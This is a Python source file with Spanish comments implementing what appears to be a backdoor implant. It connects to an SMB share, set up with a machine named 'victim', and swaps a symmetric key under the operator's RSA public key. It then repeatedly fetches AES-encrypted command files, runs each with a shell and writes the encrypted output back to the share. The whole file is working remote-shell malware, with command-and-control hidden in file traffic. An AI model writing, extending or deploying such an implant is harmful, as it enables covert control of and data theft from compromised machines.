import tempfile, os, subprocess, time, string, random
from cryptography.hazmat.primitives import hashes, asymmetric # type: ignore
from cryptography.hazmat.primitives import serialization # type: ignore
from smb.SMBConnection import SMBConnection # type: ignore
import hashlib, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.primitives import padding # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore

# Configuración de los archivos utilizados
command_file_name = "command.txt"  # Nombre del archivo de comandos
response_file_name = "result.txt"  # Nombre del archivo de respuestas
symetric_key_file_name = "pass.txt" # Nombre del archivo de la clave simetrica
public_key_file_name = "a.pub"  # Nombre del archivo de la clave pública

# Configuración de la conexión SMB
smb_user = "smbuser"  # Usuario SMB
smb_pass = "smbpass"  # Contraseña SMB
smb_address = "127.0.0.1"  # Dirección IP del servidor SMB
smb_client_machine_name = "server"  # Nombre de la máquina cliente
smb_server_name = "victim"  # Nombre de la máquina servidor
smb_domain_name = "WORKGROUP"  # Nombre del dominio SMB
smb_use_ntlm_v2 = True  # Usar NTLMv2 para autenticación
smb_port = 445  # Puerto SMB
shared_folder = "shared"  # Nombre del recurso compartido
file_path = "example_folder/"  # Definir la ruta en el recurso compartido

# Otras configuraciones
sleep_time = 5  # Tiempo de espera entre comprobaciones de archivos en SMB
timeout_time = sleep_time + sleep_time/2  # Tiempo de espera antes de finalizar un comando

def encrypt_with_symmetric_key(key, plaintext):
    # Generar un IV (Vector de Inicialización) aleatorio para el modo CBC
    iv = os.urandom(16)  # AES usa bloques de 16 bytes

    # Crear un objeto de cifrado AES en modo CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    # Crear un objeto para hacer padding en el mensaje
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    # Cifrar el mensaje
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    # Devolver el IV y el texto cifrado, ambos en formato base64 para su transmisión segura
    return base64.b64encode(iv + ciphertext).decode('utf-8')

# Función para descifrar un mensaje con AES
def decrypt_with_symmetric_key(key, ciphertext_base64):
    # Convertir el texto cifrado de base64 a bytes
    ciphertext_with_iv = base64.b64decode(ciphertext_base64)

    # Extraer el IV y el texto cifrado
    iv = ciphertext_with_iv[:16]
    ciphertext = ciphertext_with_iv[16:]

    # Crear un objeto de cifrado AES en modo CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    # Crear un objeto para quitar el padding del mensaje
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()

    # Descifrar el mensaje
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Eliminar el padding del mensaje
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    # Devolver el mensaje descifrado como texto
    return plaintext.decode('utf-8')

# Función para configurar la conexión SMB
def setup_server():
    conn = SMBConnection(smb_user, smb_pass, smb_client_machine_name, smb_server_name, domain=smb_domain_name, use_ntlm_v2=smb_use_ntlm_v2)
    conn.connect(smb_address, smb_port)
    return conn

def check_if_file_exists(conn, filename):
    try:
        # Intentar obtener el archivo. Si no existe, lanza una excepción.
        file_attributes = conn.getAttributes(shared_folder, file_path + filename)
        return True  # El archivo existe
    except:
        return False  # El archivo no existe


def delete_file_from_smb(conn, filename):
    # Intentar borrar el archivo en el recurso compartido
    conn.deleteFiles(shared_folder, file_path + filename)

def write_to_smb(conn, filename, content):
    # Crear un archivo temporal
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(content)  # Escribir el contenido en el archivo temporal
        temp_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Subir el archivo al recurso compartido
    with open(temp_filename, 'rb') as temp_file:
        conn.storeFile(shared_folder, file_path + filename, temp_file)  # Usar storeFile para subir

    # Eliminar el archivo temporal
    os.remove(temp_filename)

def read_from_smb(conn, filename):
    # Crear un archivo temporal para almacenar el archivo descargado
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        local_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Descargar el archivo desde SMB
    with open(local_filename, 'wb') as local_file:
        conn.retrieveFile(shared_folder, file_path + filename, local_file)  # Descargar el archivo desde SMB

    # Leer el archivo descargado
    with open(local_filename, 'r') as f:
        command = f.read()

    # Eliminar el archivo temporal
    os.remove(local_filename)

    return command

def generate_random_password(length=12):
    # Definir los caracteres posibles: letras mayúsculas, minúsculas, dígitos y símbolos
    all_characters = string.ascii_letters + string.digits + string.punctuation

    # Generar la contraseña aleatoria
    password = ''.join(random.choice(all_characters) for _ in range(length))
    return password

def load_public_key(public_key_pem):
    # Asegúrate de que los datos leídos sean en formato bytes
    return serialization.load_pem_public_key(public_key_pem)

# Función para cifrar un mensaje con la clave pública
def encrypt_with_public_key(public_key, message):
    ciphertext = public_key.encrypt(
        message.encode(),  # Codificar el mensaje a bytes
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return ciphertext

def main():
    conn = setup_server()
    hashed_data = ""  # Inicializar hashed_data para que no haya error en la comparación

    while True:
        if check_if_file_exists(conn, public_key_file_name):
            # Leer la clave pública como bytes
            public_key_pem = read_from_smb(conn, public_key_file_name).encode('utf-8')  # Convertir el string a bytes
            public_key = load_public_key(public_key_pem)
            random_password = generate_random_password(16)
            ciphertext = encrypt_with_public_key(public_key, random_password)
            delete_file_from_smb(conn, public_key_file_name)
            write_to_smb(conn, symetric_key_file_name, ciphertext)  # Escribir el contenido cifrado
            break
        time.sleep(sleep_time)

    while True:
        if check_if_file_exists(conn, command_file_name):
            try:
                # Leer y descifrar el comando
                encrypted_command = read_from_smb(conn, command_file_name)
                command = decrypt_with_symmetric_key(random_password.encode('utf-8'), encrypted_command)
                delete_file_from_smb(conn, command_file_name)
                # Manejar el comando 'exit'
                if command == 'exit':
                    break
                # Manejar el comando 'cd'
                if command.startswith('cd '):
                    directory = command[3:].strip()
                    os.chdir(directory)
                    response = ''.encode('utf-8')  # Respuesta vacía si el cambio de directorio es exitoso
                    
                else:
                    response = subprocess.run(command, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, timeout=timeout_time)
                    response = response.stdout

            except subprocess.CalledProcessError as e:
                response = f"\033[31mError ejecutando el comando: {e.output.decode()}\033[0m".encode('utf-8')
            except subprocess.TimeoutExpired:
                response = f"\033[31mError: El comando excedio el tiempo de ejecucion permitido.\033[0m".encode('utf-8')
            except FileNotFoundError:
                response = f"\033[31mError: No se pudo cambiar al directorio '{directory}'.\033[0m".encode('utf-8')
            except Exception as e:
                response = f"\033[31mError inesperado: {str(e)}\033[0m".encode('utf-8')
            if response != f"\033[31mError inesperado: Invalid padding bytes.\033[0m".encode('utf-8'):
                # Cifrar y escribir la respuesta
                encrypted_response = encrypt_with_symmetric_key(random_password.encode('utf-8'), response)
                write_to_smb(conn, response_file_name, encrypted_response.encode('utf-8'))
        else:
            time.sleep(sleep_time)

    conn.close()

if __name__ == "__main__":
    main()
